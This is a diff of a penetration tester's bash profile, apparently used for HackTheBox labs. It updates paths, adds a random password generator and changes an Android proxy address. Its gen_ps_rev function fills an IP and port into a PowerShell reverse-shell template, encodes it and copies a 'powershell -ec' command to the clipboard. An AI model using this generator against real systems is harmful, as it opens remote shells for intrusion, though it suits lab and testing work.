@@ -1,3 +1,6 @@
+
+# Add Opt/Gen path
+PATH=$PATH:/opt/shared/shells
 function urldecode() { local i="${*//+/ }"; echo -e "${i//%/\\x}"; }
 
 # TODO i might need to look for a "simpler" & reliable one
@@ -31,7 +34,7 @@ gen_ps_rev () {
     then
       echo "[i] Usage: gen_ps_rev ip port"
     else
-      SHELL=`cat ~/shared/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
+      SHELL=`cat /opt/shared/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
       echo "powershell -ec $SHELL" | xclip -sel clip
   fi
 }
@@ -44,6 +47,18 @@ httpserver () {
   fi
 }
 
+genpass() {
+  length=16
+  if [[ -n "$1" ]]; then
+    length="$1"
+  fi
+  password=$(tr -dc 'A-Za-z0-9!?%=' < /dev/urandom | head -c "$length")
+  echo $password
+}
+
+
+
+
 # alias httpserver="python3 -m http.server $@"
 export MIP=$(ifconfig tun0 2>/dev/null | grep inet | awk '{print $2}' | head -n1)
 alias mip="echo $MIP"
@@ -54,6 +69,6 @@ alias ww='cd /opt/share/www/'
 alias htb="cd ~/MMach/HTB/"
 alias mhtb="mkdir ~/MMach/HTB/$1"
 alias connect='cd /opt/shared/access'
-alias proxy_set='adb shell settings put global http_proxy 192.168.1.110:8080'
+alias proxy_set='adb shell settings put global http_proxy 192.168.1.5:8080'
 alias proxy_unset='adb shell settings put global http_proxy :0'
 export WWW=/opt/shared/www/
